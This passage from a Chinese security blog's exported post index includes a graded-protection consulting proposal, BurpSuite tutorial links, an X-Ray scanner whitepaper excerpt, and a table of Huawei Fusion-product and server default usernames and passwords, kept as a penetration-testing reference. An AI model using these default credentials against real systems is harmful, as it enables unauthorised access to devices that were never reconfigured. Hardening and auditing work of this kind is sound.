工作内容</h3><p>系统脆弱性检测涉及三个层面工作内容，包含整体的网络架构分析，服务器、网络与安全设备的配置检查，以及漏洞扫描检测工作。具体内容如下：</p><p>1、网络架构分析：</p><p>进行网络架构分析的目的是查找需要对网络结构实施优化的事项，具体内容如下：；(1)网络现状识别：涉及应用系统和用户分布，安全；(2)网络安全分析：从网络的整体架构进行考虑，紧急；如下：</p><p>(1)网络现状识别：涉及应用系统和用户分布，安全域划分，区域边界之间所采取的访问控制措施，网络带宽需求及现状，对数据流向的安全控制，设备链路冗余设计，对网络带宽的管控措施，远程访问通信链路的加密，各区域内所采取的入侵检测，安全审计措施，网络出口所采取的入侵防范、病毒过滤、垃圾邮件过滤措施、终端用户接入认证等内容。</p><p>(2)网络安全分析：从网络的整体架构进行考虑，紧密结合业务应用现状，识别重要信息系统部署和用户所在网络区域的分布情况，分析网络设计布局的合理性，是否存在单点隐患，确认链路带宽是否满足业务要求，检查产品设备老化问题，确认设备性能是否满足要求，分析网络区域边界是否定义清晰，安全域划分是否合理，服务器、终端接入是否安全，各类安全设备的部署是否到位等。</p><p>2、设备配置检查：</p><p>检查系统相关服务器、交换机与安全设备的配置策略，具体内容如下：</p><p>(1)服务器手工检查：检查服务器操作系统、数据库和中间件的开放服务及端口、账户设置、文件权限设置、审计、共享资源、补丁更新和病毒防护等情况；</p><p>(2)网络设备手工检查：检测交换机或路由器的Vlan划分、路由表配置、访问控制列表ACL、IP和MAC地址绑定情况、设备登录认证方式、口令设置等配置项；</p><p>(3)安全设备手工检查：获取防火墙的访问控制策略、以透明还是路由方式部署、NAT地址转换、网络连接数限制等信息，检查入侵检测、安全审计设备的审计策略配置、特征库版本情况等。</p><p>3、漏洞扫描检测：</p><p>借助专业化漏洞检测工具，对检测范围内的交换机、路由器和服务器实施扫描，发现配置上存在的弱点，作为对手工检查工作所获取数据的补充，同时也是制定安全加固方案的重要依据。</p><h3 id="4-2-2-交付成果"><a href="#4-2-2-交付成果" class="headerlink" title="4.2.2 交付成果"></a>4.2.2 交付成果</h3><p>信息系统脆弱性评估报告</p><h2 id="4-3-渗透测试"><a href="#4-3-渗透测试" class="headerlink" title="4.3 渗透测试"></a>4.3 渗透测试</h2><p>通过模拟黑客对信息系统进行渗透测试，发现分析并验证其存在的主机安全漏洞、敏感信息泄露、SQL注入漏洞、XSS跨站脚本漏洞及弱口令等安全隐患，评估系统抗攻击能力，提出安全加固建议。</p><h3 id="4-3-1-工作内容"><a href="#4-3-1-工作内容" class="headerlink" title="4.3.1 工作内容"></a>4.3.1 工作内容</h3><p>针对信息系统的渗透测试将采取两种类型：</p><p>第一类型：互联网渗透测试，是通过互联网发起远程攻击，比其他类型的渗透测试更能说明漏洞的严重性；</p><p>第二类型：内网渗透测试，通过接入内部网络发起内部攻击，主要针对信息系统的后台管理系统进行测试。</p><h3 id="4-3-2-交付成果"><a href="#4-3-2-交付成果" class="headerlink" title="4.3.2 交付成果"></a>4.3.2 交付成果</h3><p>信息系统渗透测试报告</p><h2 id="4-4-源代码测评"><a href="#4-4-源代码测评" class="headerlink" title="4.4 源代码测评"></a>4.4 源代码测评</h2><p>源代码安全测试对所提供的源代码采用工具进行安全扫描，分析和软件安全风险管理，并给出安全问题审计结果，安全问题描述和推荐修复建议。</p><h3 id="4-4-1-工作内容"><a href="#4-4-1-工作内容" class="headerlink" title="4.4.1 工作内容"></a>4.4.1 工作内容</h3><p>依据CVE（Common Vulnerabilities &amp; Exposures）安全漏洞库、设备及软件厂商公布的漏洞，根据测试用例对信息系统的源代码进行安全扫描，对安全漏洞进行识别，给出整改建议</p><h3 id="4-4-2-交付成果"><a href="#4-4-2-交付成果" class="headerlink" title="4.4.2 交付成果"></a>4.4.2 交付成果</h3><p>信息系统源代码测试报告</p><h1 id="0x05-信息系统安全整改咨询"><a href="#0x05-信息系统安全整改咨询" class="headerlink" title="0x05 信息系统安全整改咨询"></a>0x05 信息系统安全整改咨询</h1><p>信息系统安全整改包含3方面工作内容：首先测评机构将指导系统运维方针对脆弱性检测和渗透测试所发现的技术层面的安全隐患进行整改，其次以等级保护对应等级的管理要求为依据建立健全信息安全管理制度，最后依照信息系统安全规划方案指导信息系统优化和完善信息系统安全防护措施，并对系统安全整改情况进行跟踪和效果评价，为后续开展的等级测评工作奠定良好基础。</p><h2 id="5-1-安全加固与优化"><a href="#5-1-安全加固与优化" class="headerlink" title="5.1 安全加固与优化"></a>5.1 安全加固与优化</h2><p>根据前期脆弱性评估、渗透测试结果，结合信息系统的业务需求，对信息系统相关设备进行安全策略加强、调优等，加强网络、系统和设备抵御攻击和威胁的能力，整体提高网络安全防护水平。</p><h3 id="5-1-1-工作内容"><a href="#5-1-1-工作内容" class="headerlink" title="5.1.1 工作内容"></a>5.1.1 工作内容</h3><p>根据前期对信息系统进行的调研、评估与测评结果，以脆弱性评估报告和渗透测试报告为依据，根据网络安全特殊需求和业务流程制定安全加固方案，在不影响当前业务开展的前提下，对信息系统内的操作系统、数据库、安全设备以及中间件的安全配置策略进行加强，及时消除因安全漏洞被恶意攻击者利用从而引发的风险。</p><p>根据信息系统网络现状，本次项目安全加固对象分为四类，即信息系统内的操作系统、数据库、中间件以及网络与安全设备。</p><h3 id="5-1-2-交付成果"><a href="#5-1-2-交付成果" class="headerlink" title="5.1.2 交付成果"></a>5.1.2 交付成果</h3><p>信息系统安全加固与优化方案</p><h2 id="5-2-等级保护制度建设"><a href="#5-2-等级保护制度建设" class="headerlink" title="5.2 等级保护制度建设"></a>5.2 等级保护制度建设</h2><p> 以等级保护差距分析结果为依据，依照安全保障体系设计所提及的建设内容，按照等级保护标准要求，制定等级保护管理体系框架，明确管理方针、策略，以及相应的规定、操作规程、业务流程和记录表单；测评机构从结合信息系统实际业务流程的原则出发，指导系统运维方按照等级保护对应等级的管理标准，编写管理制度文件，并进行反复沟通和修订，确保所制定的文件的适用性，且满足各系统相应保护等级的安全管理要求。</p><h3 id="5-2-1-工作内容"><a href="#5-2-1-工作内容" class="headerlink" title="5.2.1 工作内容"></a>5.2.1 工作内容</h3><p>制定和完善与信息系统的安全保护等级相适应的配套管理制度，制度相关内容如下：</p><p>(1)安全管理机构：加强和完善安全机构的建设，设立指导和管理信息安全工作的信息安全领导小组，设立安全主管、安全管理各个方面的负责人，明确定义各个工作岗位的职责。建立各种安全管理活动的审批程序，明确对内对外的沟通协作方式，建立对各项安全管理活动的监督审核机制。</p><p>(2)安全管理制度：在差距分析的基础上，建立信息安全工作总体方针、安全策略，以方针策略为依据建立配套的安全管理制度及流程规范，由专门的组织机构负责管理制度的制订、发布和贯彻落实。定期对制度进行评审和修订，确保管理制度的适用性。</p><p>(3)人员安全管理：主要涉及两方面，对内部人员的安全管理和对外部人员的安全管理。具体包括人员录用、人员离岗、人员考核、安全意识教育和培训和外部人员访问管理等方面。</p><p>(4)系统建设管理：为了建设符合安全等级保护要求的信息系统、系统建设管理主要关注的是信息系统生命周期中的前三个阶段（即设计、采购、实施）中各</p><p>项安全管理活动，实现信息系统的安全管理贯穿系统的整个生命周期。系统建设管理分别从工程实施建设前、建设过程以及建设完毕交付等三方面考虑，具体包括系统定级、安全方案设计、产品采购和使用、自行软件开发、外包软件开发、工程实施、测试验收、系统交付、系统备案、等级测评和安全服务商选择等方面。</p><p>(5)系统运维管理：系统运行涉及到很多管理方面，要保证系统始终处于相应安全保护等级的安全状态中。要监控系统发生的重大变化，以便修改对应的安全措施。系统运维管理主要包括环境管理、资产管理、介质管理、设备管理、监控管理和安全管理中心、网络安全管理、系统安全管理、恶意代码防范管理、密码管理、变更管理、备份与恢复管理、安全事件处置、应急预案管理等方面。</p><h3 id="5-2-2-交付成果"><a href="#5-2-2-交付成果" class="headerlink" title="5.2.2 交付成果"></a>5.2.2 交付成果</h3><p>信息系统安全管理制度</p><h1 id="0x06-信息安全等级测评"><a href="#0x06-信息安全等级测评" class="headerlink" title="0x06 信息安全等级测评"></a>0x06 信息安全等级测评</h1><p>信息系统安全等级测评是测评机构依据国家信息安全等级保护制度规定，按照有关管理规范和技术标准，对非涉及国家秘密信息系统安全等级保护状况进行检测评估的活动。信息系统安全等级测评主要检测和评估信息系统在安全技术、安全管理等方面是否符合已确定的安全等级的要求；对于尚未符合要求的信息系统，分析和评估其潜在威胁、薄弱环节以及现有安全防护措施，综合考虑信息系统的重要性和面临的安全威胁等因素，提出相应的整改建议，并在系统整改后进行复测确认，以确保整改措施符合相应安全等级的基本要求。</p><h2 id="6-1-测评内容"><a href="#6-1-测评内容" class="headerlink" title="6.1 测评内容"></a>6.1 测评内容</h2><p>针对信息系统的安全等级测评的内容如下：</p><p>(1)按照《信息系统安全等级保护测评要求》，从以下方面进行等级测评：</p><p>技术安全测评：包括物理安全、网络安全、主机安全、数据安全、应用安全；</p><p>管理安全测评：包括安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理；</p><p>综合测评：包括安全控制间安全测评、层面间安全测评、区域间安全测评、系统结构安全测评。</p><p>(2)对每个保护类的子项给出测评结果并分别提出改进建议；</p><p>(3)按照整改结果进行复测，出具等级测评报告。</p><h2 id="6-2-交付成果"><a href="#6-2-交付成果" class="headerlink" title="6.2 交付成果"></a>6.2 交付成果</h2><p>信息系统等级测评报告</p><h1 id="0x07-信息安全等级保护服务报价"><a href="#0x07-信息安全等级保护服务报价" class="headerlink" title="0x07 信息安全等级保护服务报价"></a>0x07 信息安全等级保护服务报价</h1><p>等级保护按照运行的业务进行定级，不同业务可以定不同保护等级，根据基础网络、管理制度复用原则进行多个业务系统报价（三级、二级系统报价明细见附件）。</p><p>按照10个业务系统计算，进行定级备案、建设规划、安全测评、整改咨询、等级测评报告等5项服务，预估报价如下：</p><p>10个三级系统：</p><p>预估总价=34.78+9×3.55=66.73万元10个二级系统：</p><p>预估总价=20.77+9×2.1=39.67万元5个三级系统5个二级系统：</p><p>预估总价=34.78+4×3.55+5×2.1=59.48万元</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 等级保护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全法</title>
      <link href="/2019/10/24/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
      <url>/2019/10/24/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>法律，是每个公民必须要遵守的准则，触犯法律的底线将受到法律的惩罚。随着2016年11月7日《中华人民共和国网络安全法》的发布，意味着每一个网络也不是法外之地，任何人都要遵守法律，不搞黑产，不入侵计算机，不盗窃用户的数据等等。</p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 法律 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞案例大全</title>
      <link href="/2019/10/18/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E5%A4%A7%E5%85%A8/"/>
      <url>/2019/10/18/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>每天工作之余卡在微信公众号或者订阅的博客中看看别人写的文章，但是我相信肯定有人和我一样，看完文章以后的感觉</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/b1a663d5adb16eb9" class="lozad"></p><p>然后，就没有然后了，可能当时的确学习到了别人的思路或者想法，但是在短的时间内要吃透别人的文章是不可能的，所以这里作为自己的漏洞案例大全，将自己在渗透测试过程中或者看到好的文章中的一些漏洞的案例记录下来，在时间允许的情况下加以分类。方便自己，帮助他人，共勉~</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/816554f290b20da5" class="lozad"></p><a id="more"></a><h1 id="0x01-越权"><a href="#0x01-越权" class="headerlink" title="0x01 越权"></a>0x01 越权</h1><h2 id="1-1-越权访问"><a href="#1-1-越权访问" class="headerlink" title="1.1 越权访问"></a>1.1 越权访问</h2><h3 id="1-1-1-Fuzz大法之挖掘潜的逻辑越权"><a href="#1-1-1-Fuzz大法之挖掘潜的逻辑越权" class="headerlink" title="1.1.1 Fuzz大法之挖掘潜的逻辑越权"></a>1.1.1 Fuzz大法之挖掘潜的逻辑越权</h3><h1 id="0x02-逻辑漏洞"><a href="#0x02-逻辑漏洞" class="headerlink" title="0x02 逻辑漏洞"></a>0x02 逻辑漏洞</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为账户信息一览表</title>
      <link href="/2019/10/16/%E5%8D%8E%E4%B8%BA%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF%E4%B8%80%E8%A7%88%E8%A1%A8/"/>
      <url>/2019/10/16/%E5%8D%8E%E4%B8%BA%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF%E4%B8%80%E8%A7%88%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>弱口令是渗透测试中的一个非常常见也非常严重的一个漏洞，很多系统被入侵脱裤是从一个弱口令爆破成功开始的。这里记录一下华为设备的一些默认弱口令，为了方便以后自己查阅使用。</p><p><img alt="img" data-src="https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-9eef65073f0f6be0-1760dba9c1e181b0964c091e0af19e63.jpg" class="lozad"></p><a id="more"></a><h1 id="0x01-FusionManager"><a href="#0x01-FusionManager" class="headerlink" title="0x01 FusionManager"></a>0x01 FusionManager</h1><table><thead><tr><th>账户说明</th><th>默认账号</th></tr></thead><tbody><tr><td>FusionManager帐户</td><td>用户名：admin密码：Admin@123</td></tr><tr><td>FusionManager帐户<strong>说明：</strong>使用该帐户登录FusionManager并跳转到FusionCompute后，拥有FusionCompute系统的所有管理和维护权限。使用其余帐户跳转到FusionCompute后，只能查看数据和修改告警阈值。</td><td>用户名：geadmin密码：Admin@123</td></tr><tr><td>FusionManager节点操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用galaxmanager帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：Huawei@001</td></tr><tr><td>FusionManager节点操作系统帐户（业务帐户）</td><td>用户名：galaxmanager密码：GalaxManager_2012</td></tr><tr><td>FusionManager访问数据库的帐户</td><td>用户名：galaxmanager密码：GalaxManager7!</td></tr><tr><td>FusionManager数据库的帐户</td><td>用户名：cloudmgr密码：Manager@123</td></tr><tr><td>FusionManager数据库默认的系统帐户</td><td>用户名：sys密码：System@123</td></tr></tbody></table><h1 id="0x02-FusionCompute"><a href="#0x02-FusionCompute" class="headerlink" title="0x02 FusionCompute"></a>0x02 FusionCompute</h1><table><thead><tr><th>账号说明</th><th>默认账号</th></tr></thead><tbody><tr><td>主机的操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用gandalf帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：Huawei_123</td></tr><tr><td>主机的操作系统帐户（业务帐户）</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>VRM节点的操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用gandalf帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：root</td></tr><tr><td>VRM节点的操作系统帐户（业务帐户）</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>FusionCompute访问数据库的帐户</td><td>用户名：galax密码：SingleLOUD!1</td></tr><tr><td>管理节点VNC登录帐户</td><td>用户名：root密码：GalaX088</td></tr></tbody></table><h1 id="0x03-FusionStorage"><a href="#0x03-FusionStorage" class="headerlink" title="0x03 FusionStorage"></a>0x03 FusionStorage</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>FusionStorage Manager节点操作系统帐户</td><td>用户名：root密码：UVP_2012lab</td></tr><tr><td>FusionStorage Manager节点操作系统的业务帐户</td><td>用户名：dsware密码：dsmHuawei@123</td></tr><tr><td>FusionStorage访问数据库的帐户</td><td>用户名：omm密码：ommHuawei@123</td></tr></tbody></table><h1 id="0x04-内部部件通讯账户"><a href="#0x04-内部部件通讯账户" class="headerlink" title="0x04  内部部件通讯账户"></a>0x04  内部部件通讯账户</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>FusionManager对FusionCompute的内部通讯帐户</td><td>用户名：GERest密码：Rest@GE123</td></tr><tr><td>FusionCompute对FusionManager的内部通讯帐户</td><td>用户名：gmsysman密码：GMEnginE@123</td></tr><tr><td>FusionManager对FusionStorage的内部通讯帐户</td><td>用户名：OmmRest密码：Omm@1234</td></tr><tr><td>FusionStorage对FusionManager的内部通讯帐户</td><td>用户名：gmadmin密码：gmHuawei@123</td></tr><tr><td>FusionManager内部的通讯帐户</td><td>用户名：GmUhmRest密码：Rest@GmUhm123</td></tr><tr><td>FusionCompute内部的通讯帐户</td><td>用户名：gesysman密码：GeEnginE@123</td></tr></tbody></table><h2 id="FusionStorage对外提供的Rest接口帐户"><a href="#FusionStorage对外提供的Rest接口帐户" class="headerlink" title="FusionStorage对外提供的Rest接口帐户"></a>FusionStorage对外提供的Rest接口帐户</h2><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionStorage对其他Rest接口帐户提供的接口帐户</td><td>用户名：admin密码：Huawei@123</td></tr><tr><td>FusionStorage对健康检查工具提供的接口帐户</td><td>用户名：healthycheckadmin密码：hcHuawei@123</td></tr><tr><td>FusionStorage对CLI命令行界面提供的接口帐户</td><td>用户名：cmdadmin密码：cmdHuawei@123</td></tr><tr><td>FusionStorage对升级补丁提供的接口帐户</td><td>用户名：upadmin密码：upHuawei@123</td></tr><tr><td>FusionStorage预留的Rest接口帐户</td><td>用户名：rsadmin密码：rsHuawei@123</td></tr><tr><td>FusionStorage对HA机制提供的接口帐户</td><td>用户名：haadmin密码：haHuawei@123</td></tr><tr><td>FusionStorage对OMM内部模块提供的接口帐户</td><td>用户名：systemman密码：Admin@123</td></tr><tr><td>FusionStorage对FusionCompute提供的接口帐户</td><td>用户名：geadmin密码：geHuawei@123</td></tr></tbody></table><h1 id="0x05-FusionManager访问硬件设备的帐户"><a href="#0x05-FusionManager访问硬件设备的帐户" class="headerlink" title="0x05 FusionManager访问硬件设备的帐户"></a>0x05 FusionManager访问硬件设备的帐户</h1><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionManager访问主机操作系统的帐户</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>FusionManager访问主机BMC的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问机框的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问存储设备的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问交换机的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr></tbody></table><h1 id="0x06-FTP账户"><a href="#0x06-FTP账户" class="headerlink" title="0x06 FTP账户"></a>0x06 FTP账户</h1><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionCompute下发CNA、Tools补丁到主机上的帐户</td><td>用户名：ftppatchuser密码：Patch_123</td></tr><tr><td>日志服务器FTP帐户</td><td>用户名：cnalog密码：1q2w3e~!</td></tr></tbody></table><h1 id="0x07-硬件设备账户"><a href="#0x07-硬件设备账户" class="headerlink" title="0x07 硬件设备账户"></a>0x07 硬件设备账户</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>E6000服务器刀片BMC系统帐户</td><td>用户名：root密码：root</td></tr><tr><td>E6000服务器管理模块帐户</td><td>用户名：root密码：huaweiosta</td></tr><tr><td>E9000服务器刀片BMC系统帐户</td><td>用户名：root密码：Huawei12#$</td></tr><tr><td>E9000服务器管理模块帐户</td><td>用户名：root密码：Huawei12#$</td></tr><tr><td>IP SAN存储管理系统帐户</td><td>用户名：admin密码：Admin@storage</td></tr></tbody></table><h1 id="0x08-参考文档"><a href="#0x08-参考文档" class="headerlink" title="0x08 参考文档"></a>0x08 参考文档</h1><p><a href="http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000028274&amp;partNo=10062" target="_blank" rel="noopener">http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000028274&amp;partNo=10062</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 社会工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite专题学习指南</title>
      <link href="/2019/10/15/burpsuite%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
      <url>/2019/10/15/burpsuite%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484189&idx=1&sn=6c5873495cc2c174b0db3ced494cbce1&chksm=ec1f5622db68df34503f9a0410d83efc367f5da3c5d9264cb64e9f6f2577c12c4a59f36e68db&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(一)—-Proxy模块(代理模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484192&idx=1&sn=998ae5b52c071ecc7234fffb6e58a690&chksm=ec1f561fdb68df09b3aee7a1751659fcf1f9e8f739d9fd3d5fb59ef24f2c4b53e565c8079348&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(二)—-Target模块(目标模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484195&idx=1&sn=0e054c30f5c14ffc012678c26326d46f&chksm=ec1f561cdb68df0a37f4aec1150dbcad5c7b2c0b294cfe4490349d802178fd26a05ff8d05d56&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(三)—-Spider模块(蜘蛛爬行)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484213&idx=1&sn=e9eea6b651e5d39b2a1d9a373db97ea6&chksm=ec1f560adb68df1cc5a14040d8a7c1783ba9098f01d7499bf15d20eb1de50449d2a2d39634ef&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(四)—-Scanner模块(漏洞扫描)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484215&idx=1&sn=56368486f712b349113c11c9d5139d92&chksm=ec1f5608db68df1ebef0fcc0870bbcaa8f7b03b178dcdcebd0e6d33d3ea74fd397419ac6a4d1&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(五)—-Intruder模块(暴力破解)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484216&idx=1&sn=345bcb5cd8b598a6b5b2b792c374a78f&chksm=ec1f5607db68df11317d09f8dc06966cec1679b182760ea09848e8692546de19e641e81f8272&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(六)—-Repeater模块(中继器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484217&idx=1&sn=855efefe772c27635c5fb3d993d331fa&chksm=ec1f5606db68df106caa857983d65168a6168ba7090327ef540213f5b97e28af5f85994d21e9&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(七)—-Sequencer模块(定序器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484218&idx=1&sn=7e863b2c0b02e188971bbe24055b2a2e&chksm=ec1f5605db68df134d14d971f06500a78eca76578a134f693b00f6e356dc425b4a92194d1ed1&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(八)—-decoder模块(编码模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484218&idx=2&sn=6aadd3f1d183d59348ad7c1d446d5152&chksm=ec1f5605db68df130268ef885705122354e79f677be3c61f625ab54d9b2c77d58d7f3d253164&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(九)—-Comparer模块(比较器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484219&idx=1&sn=de0e90b15f8f774688ab198654e7e861&chksm=ec1f5604db68df1215920b3f8e1a05bbce557b821e1aa32de0a511f8b1a9ddd63fcee9ab869d&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十)—-Extender模块(扩展器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484220&idx=1&sn=5c2c4b50fd0305ce06f86fdcbe50833c&chksm=ec1f5603db68df15800342dd58ecebb71318c901b86a1e73e510a22bd0964ddcfd2bec5423c5&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十一)—-Project options模块(项目选择)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484221&idx=1&sn=c7d96cfd3f44ddf7974bb0f5a666722a&chksm=ec1f5602db68df1445eb53adf08d3232e23a4a9f1f7a06608f2dd322e0cbda294a67ee1fe4df&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十二)—-User options模块(用户选择)</a></p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-Ray白皮书</title>
      <link href="/2019/10/12/X-Ray%E7%99%BD%E7%9A%AE%E4%B9%A6/"/>
      <url>/2019/10/12/X-Ray%E7%99%BD%E7%9A%AE%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在之前介绍过一篇长亭科技开发的工具叫X-ray，今天在网上看到了这款工具的白皮书，为了防止以后找不到了，这里直接以文章的形式记录下来。如有侵权，请联系删除！</p><a id="more"></a><h1 id="0x01-如何有效进行安全评估？"><a href="#0x01-如何有效进行安全评估？" class="headerlink" title="0x01 如何有效进行安全评估？"></a>0x01 如何有效进行安全评估？</h1><p>70%的网站存在漏洞，可能导致资金被盗、用户隐私信息泄露、系统瘫痪等问题。<br>2017年全球泄露或被盗的数据超过50亿条，其中仅上半年就达到19亿条，超过<br>了2016年全年被盗数据总量。CNNVD公布的2017年漏洞数量为14,748个，2016年<br>全年的漏洞总数为8,753个，年增长率达到了70%。面对逐年激增的漏洞与信息泄露事件，企业必须建立一套完善的安全评估系统。而企业目前所面临的安全评估或多或少都存在着一些问题。<br>【资产发现难】<br>• 企业规模不断扩大，难以审计大量新设备；<br>• 员工自带设备（BYOD）存在各种隐形威胁；<br>• 各种小实验室、小型办公网络难以监控。<br>【扫描能力弱】<br>• 爬虫能力弱，难以发现内网服务、设备存在的安全问题或未修复的漏洞；<br>• 无法自动发现扫描目标，无法自定义扫描资产、漏洞类型，用户体验差。<br>应急响应无力：<br>• 漏洞爆发，无法在极短时间内对整个内网的大规模设备群进行清查。<br>伸缩与扩展性差：<br>• 只能在部署时既定的区域内进行扫描工作，无法应对不断变化的企业内网环境。<br>• 在不同的网络之间扫描可能会带来冲突，实际使用效率大打折扣。</p><h1 id="0x02-X-Ray安全评估系统"><a href="#0x02-X-Ray安全评估系统" class="headerlink" title="0x02 X-Ray安全评估系统"></a>0x02 X-Ray安全评估系统</h1><p>（X-Ray）是由长亭安全团队基于扎实攻防经验，历经多年实战打磨的一款集合资产管理、Web扫描、主机扫描为一体的安全评估系统。<br>X-Ray安全评估系统，将人工检测漏洞的思维路径转化成机器语言，X-Ray实现了自动化精准漏洞识别，可发现大规模资产并进行方便快捷管理，同时提供详细的漏洞信息及修复策略，快速、全面地修复系统漏洞。</p><h2 id="2-1-高度自定义，扫描深度隐藏漏洞"><a href="#2-1-高度自定义，扫描深度隐藏漏洞" class="headerlink" title="2.1 高度自定义，扫描深度隐藏漏洞"></a>2.1 